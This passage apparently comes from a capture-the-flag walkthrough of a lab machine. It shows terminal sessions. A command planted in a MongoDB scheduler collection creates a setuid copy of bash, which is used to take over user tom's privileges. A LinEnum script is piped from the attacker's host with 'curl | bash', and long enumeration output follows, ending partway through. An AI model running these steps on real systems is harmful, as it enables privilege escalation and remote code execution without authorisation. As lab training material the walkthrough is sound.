tom       1203  0.0  5.9 1009080 45464 ?       Ssl  03:27   0:09 /usr/bin/node /var/scheduler/app.js
mark     16588  0.0  0.1  14228   940 pts/0    S+   19:20   0:00 grep --color=auto scheduler
mark@node:/tmp$
```

```sh
mark@node:~$ vi /var/scheduler/app.js
```

![](images/15.png)

```sh
mark@node:~$ mongo -p -u mark scheduler
MongoDB shell version: 3.2.16
Enter password:
connecting to: scheduler
> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});
WriteResult({ "nInserted" : 1 })
> exit
bye
mark@node:~$
```

```sh
mark@node:~$ cd /tmp/
mark@node:/tmp$ ls -l
total 1024
srwx------ 1 mongodb nogroup       0 Jun  4 03:27 mongodb-27017.sock
drwx------ 3 root    root       4096 Jun  4 03:27 systemd-private-8ff937bda92842ac82ca0446da8ce87d-systemd-timesyncd.service-tG68Z4
-rwsr-sr-x 1 tom     admin   1037528 Jun  4 19:18 tom
drwx------ 2 root    root       4096 Jun  4 03:27 vmware-root
mark@node:/tmp$
```

```sh
mark@node:/tmp$ ./tom
tom-4.3$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
tom-4.3$ exit
exit
mark@node:/tmp$
```

```sh
mark@node:/tmp$ ./tom -p
tom-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
tom-4.3$ cd /home
tom-4.3$ ls -l
total 12
drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
drwxr-xr-x 3 root root 4096 Sep  3  2017 mark
drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
tom-4.3$ cd tom
tom-4.3$ ls -l
total 4
-rw-r----- 1 root tom 33 Sep  3  2017 user.txt
tom-4.3$ cat user.txt
cat: user.txt: Permission denied
tom-4.3$ cd ..
tom-4.3$ cd mark
tom-4.3$ ls -l
total 0
tom-4.3$ cd ../frank
tom-4.3$ ls -l
total 0
tom-4.3$
```

Hardcoded `thorough=1` in `LinEnum` script

```sh
root@kali:~/node# head LinEnum.sh
#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.9"
#@rebootuser
thorough=1

#help function
usage ()
{
echo -e "\n\e[00;31m#########################################################\e[00m"
root@kali:~/node#
```

```sh
tom-4.3$ curl http://10.10.14.16:8000/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 43499  100 43499    0     0  43654      0 --:--:-- --:--:-- --:--:-- 43629

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.9

[-] Debug Info
[+] Thorough tests = Enabled


Scan started at:
Mon  4 Jun 19:29:55 BST 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-93-generic (buildd@lgw01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
node


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(mark) gid=1001(mark) groups=1001(mark)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Thu Jan 18 14:39:42 +0000 2018
tom              pts/0    10.2.0.1         Sun Sep  3 16:03:08 +0100 2017
mark             pts/0    10.10.14.16      Mon Jun  4 18:28:32 +0100 2018


[-] Who else is logged on:
 19:29:55 up 16:02,  1 user,  load average: 0.05, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mark     pts/0    10.10.14.16      18:28    3.00s  0.11s  0.00s bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root),1002(admin)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
uid=111(mongodb) gid=65534(nogroup) groups=65534(nogroup),117(mongodb)
uid=1001(mark) gid=1001(mark) groups=1001(mark)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
mongodb:x:111:65534::/home/mongodb:/bin/false
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 20K
drwxr-xr-x  5 root root 4.0K Aug 31  2017 .
drwxr-xr-x 25 root root 4.0K Sep  2  2017 ..
drwxr-xr-x  2 root root 4.0K Aug 31  2017 frank
drwxr-xr-x  3 root root 4.0K Sep  3  2017 mark
drwxr-xr-x  6 root root 4.0K Sep  3  2017 tom


[-] Files owned by our user:
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
-rw-r--r-- 1 mark mark 0 Jun  4 19:30 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release


[-] Hidden files:
-rw-r--r-- 1 root root 0 Jun  4 03:27 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 45 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/tar/.travis.yml
-rw-r--r-- 1 root root 63 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/tar/.npmignore
-rw-r--r-- 1 root root 142 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream/.travis.yml
-rw-r--r-- 1 root root 78 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream/.npmignore
-rw-r--r-- 1 root root 23 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/which/node_modules/isexe/.npmignore
-rw-r--r-- 1 root root 116 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/lockfile/.travis.yml
-rw-r--r-- 1 root root 37 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/lockfile/.npmignore
-rw-r--r-- 1 root root 54 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/JSONStream/node_modules/through/.travis.yml
-rw-r--r-- 1 root root 12 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/JSONStream/node_modules/jsonparse/.npmignore
-rw-r--r-- 1 root root 57 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/JSONStream/.travis.yml
-rw-r--r-- 1 root root 28 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/JSONStream/.npmignore
-rw-r--r-- 1 root root 189 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-installed/.travis.yml
-rw-r--r-- 1 root root 102 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-installed/.npmignore
-rw-r--r-- 1 root root 108 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/nopt/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/nopt/.npmignore
-rw-r--r-- 1 root root 14 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/npmlog/node_modules/are-we-there-yet/node_modules/delegates/.npmignore
-rw-r--r-- 1 root root 54 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/node_modules/err-code/.travis.yml
-rw-r--r-- 1 root root 25 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/node_modules/err-code/.npmignore
-rw-r--r-- 1 root root 127 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/node_modules/err-code/.eslintrc.json
-rw-r--r-- 1 root root 179 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/node_modules/err-code/.editorconfig
-rw-r--r-- 1 root root 54 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/.travis.yml
-rw-r--r-- 1 root root 25 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/.npmignore
-rw-r--r-- 1 root root 220 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/promise-retry/.editorconfig
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/agent-base/.travis.yml
-rw-r--r-- 1 root root 20 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/agent-base/.npmignore
-rw-r--r-- 1 root root 214 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/node_modules/smart-buffer/.travis.yml
-rw-r--r-- 1 root root 49 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/node_modules/smart-buffer/.npmignore
-rw-r--r-- 1 root root 1623 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/node_modules/ip/.jscsrc
-rw-r--r-- 1 root root 198 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/node_modules/ip/.travis.yml
-rw-r--r-- 1 root root 28 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/node_modules/ip/.npmignore
-rw-r--r-- 1 root root 38 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/node_modules/socks/.npmignore
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/.travis.yml
-rw-r--r-- 1 root root 14 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/socks-proxy-agent/.npmignore
-rw-r--r-- 1 root root 93 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/json-parse-helpfulerror/node_modules/jju/.npmignore
-rw-r--r-- 1 root root 587 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/json-parse-helpfulerror/.npmignore
-rw-r--r-- 1 root root 215 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/json-parse-helpfulerror/.editorconfig
-rw-r--r-- 1 root root 267 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/encoding/node_modules/iconv-lite/.travis.yml
-rw-r--r-- 1 root root 44 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/encoding/node_modules/iconv-lite/.npmignore
-rw-r--r-- 1 root root 505 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/encoding/.travis.yml
-rw-r--r-- 1 root root 12 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/node-fetch-npm/node_modules/encoding/.npmignore
-rw-r--r-- 1 root root 140 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/node_modules/agent-base/.travis.yml
-rw-r--r-- 1 root root 20 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/node_modules/agent-base/.npmignore
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/.travis.yml
-rw-r--r-- 1 root root 14 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/http-proxy-agent/.npmignore
-rw-r--r-- 1 root root 140 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/node_modules/debug/.travis.yml
-rw-r--r-- 1 root root 46 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 72 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/node_modules/debug/.npmignore
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/node_modules/agent-base/.travis.yml
-rw-r--r-- 1 root root 20 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/node_modules/agent-base/.npmignore
-rw-r--r-- 1 root root 292 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/.travis.yml
-rw-r--r-- 1 root root 20 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/make-fetch-happen/node_modules/https-proxy-agent/.npmignore
-rw-r--r-- 1 root root 190 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-stream/node_modules/bl/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-stream/node_modules/bl/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-stream/node_modules/xtend/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/minimatch/node_modules/brace-expansion/node_modules/balanced-match/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 58 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-fs/node_modules/pump/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-fs/node_modules/pump/.npmignore
-rw-r--r-- 1 root root 38 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-fs/.travis.yml
-rw-r--r-- 1 root root 32 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/pacote/node_modules/tar-fs/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream-npm/node_modules/fstream-ignore/node_modules/minimatch/node_modules/brace-expansion/node_modules/balanced-match/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream-npm/node_modules/fstream-ignore/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 214 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream-npm/.travis.yml
-rw-r--r-- 1 root root 79 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fstream-npm/.npmignore
-rw-r--r-- 1 root root 93 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-package-json/node_modules/json-parse-helpfulerror/node_modules/jju/.npmignore
-rw-r--r-- 1 root root 587 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-package-json/node_modules/json-parse-helpfulerror/.npmignore
-rw-r--r-- 1 root root 215 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-package-json/node_modules/json-parse-helpfulerror/.editorconfig
-rw-r--r-- 1 root root 11 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/from2/node_modules/readable-stream/node_modules/string_decoder/.npmignore
-rw-r--r-- 1 root root 36 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/from2/node_modules/readable-stream/.npmignore
-rw-r--r-- 1 root root 65 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/node_modules/stream-shift/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/node_modules/stream-shift/.npmignore
-rw-r--r-- 1 root root 60 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/node_modules/stream-iterate/.npmignore
-rw-r--r-- 1 root root 58 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sorted-union-stream/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/iferr/.npmignore
-rw-r--r-- 1 root root 139 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/unique-filename/node_modules/unique-slug/.travis.yml
-rw-r--r-- 1 root root 42 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/unique-filename/node_modules/unique-slug/.npmignore
-rw-r--r-- 1 root root 29 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/unique-filename/.npmignore
-rw-r--r-- 1 root root 30 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/init-package-json/node_modules/promzard/.npmignore
-rw-r--r-- 1 root root 76 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/safe-buffer/.travis.yml
-rw-r--r-- 1 root root 11 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/node_modules/string_decoder/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/node_modules/isarray/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/node_modules/isarray/.npmignore
-rw-r--r-- 1 root root 112 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/node_modules/process-nextick-args/.travis.yml
-rw-r--r-- 1 root root 1785 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/.travis.yml
-rw-r--r-- 1 root root 74 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/readable-stream/.npmignore
-rw-r--r-- 1 root root 36 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/columnify/node_modules/wcwidth/node_modules/defaults/node_modules/clone/.travis.yml
-rw-r--r-- 1 root root 14 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/columnify/node_modules/wcwidth/node_modules/defaults/node_modules/clone/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/columnify/node_modules/wcwidth/node_modules/defaults/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/columnify/node_modules/wcwidth/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/node_modules/xtend/.npmignore
-rw-r--r-- 1 root root 120 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/node_modules/errno/node_modules/prr/.travis.yml
-rw-r--r-- 1 root root 12 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/node_modules/errno/node_modules/prr/.npmignore
-rw-r--r-- 1 root root 12 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/node_modules/errno/.npmignore
-rw-r--r-- 1 root root 119 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/worker-farm/.npmignore
-rw-r--r-- 1 root root 1414 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/uuid/.eslintrc.json
-rw-r--r-- 1 root root 40 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/sha/.npmignore
-rw-r--r-- 1 root root 20 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/read-cmd-shim/.npmignore
-rw-r--r-- 1 root root 134 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/osenv/.travis.yml
-rw-r--r-- 1 root root 102 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/osenv/.npmignore
-rw-r--r-- 1 root root 42 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/config-chain/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/text-table/.travis.yml
-rw-r--r-- 1 root root 6 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/gyp/.npmignore
-rw-r--r-- 1 root root 134 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/node_modules/nopt/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/node_modules/nopt/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/node_modules/minimatch/node_modules/brace-expansion/node_modules/balanced-match/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/node_modules/minimatch/node_modules/brace-expansion/node_modules/concat-map/.travis.yml
-rw-r--r-- 1 root root 88 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/.jshintrc
-rw-r--r-- 1 root root 37 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/node-gyp/.npmignore
-rw-r--r-- 1 root root 43 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/archy/.travis.yml
-rw-r--r-- 1 root root 141 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fs-write-stream-atomic/.travis.yml
-rw-r--r-- 1 root root 37 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/fs-write-stream-atomic/.npmignore
-rw-r--r-- 1 root root 30 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/retry/.npmignore
-rw-r--r-- 1 root root 48 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/concat-stream/node_modules/typedarray/.travis.yml
-rw-r--r-- 1 root root 109 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/from2/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/through2/node_modules/xtend/.npmignore
-rw-r--r-- 1 root root 26 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/through2/.npmignore
-rw-r--r-- 1 root root 58 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/pump/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/pump/.npmignore
-rw-r--r-- 1 root root 65 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/node_modules/stream-shift/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/node_modules/stream-shift/.npmignore
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/node_modules/end-of-stream/.npmignore
-rw-r--r-- 1 root root 65 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/.travis.yml
-rw-r--r-- 1 root root 13 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/duplexify/.npmignore
-rw-r--r-- 1 root root 68 Aug 15  2017 /usr/lib/node_modules/npm/node_modules/mississippi/node_modules/pumpify/.travis.yml
